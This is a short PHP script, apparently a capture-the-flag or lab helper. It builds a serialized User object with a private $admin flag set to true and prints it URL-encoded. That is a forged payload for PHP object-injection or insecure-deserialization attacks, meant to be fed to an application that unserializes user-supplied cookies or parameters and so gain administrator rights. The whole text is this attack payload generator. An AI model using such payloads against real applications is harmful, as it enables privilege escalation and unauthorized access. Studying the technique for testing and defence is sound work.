<?php

    class User{
        private $admin = true;
    }

    $a = new User();
    echo urlencode(serialize($a));
?>